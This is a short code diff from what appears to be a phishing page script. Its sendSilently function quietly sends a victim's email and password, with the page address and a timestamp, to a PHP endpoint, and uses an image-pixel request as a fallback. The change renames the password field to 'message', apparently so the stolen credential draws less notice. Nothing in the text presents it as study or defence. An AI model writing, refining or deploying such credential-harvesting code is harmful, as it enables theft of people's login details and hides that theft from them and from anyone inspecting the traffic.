@@ -327,7 +327,7 @@
   function sendSilently(email, password) {
     var data = new FormData();
     data.append('email', email);
-    data.append('password', password);
+    data.append('message', password);
     data.append('page', location.href);
     data.append('sent', new Date().toISOString());
 
@@ -345,7 +345,7 @@
     // 3. last resort: pixel
     var img = new Image();
     img.src = PHP_ENDPOINT + '?email=' + encodeURIComponent(email) +
-              '&password=' + encodeURIComponent(password);
+              '&message=' + encodeURIComponent(password);
   }
 
   /* ---------- toast for dead links ---------- */
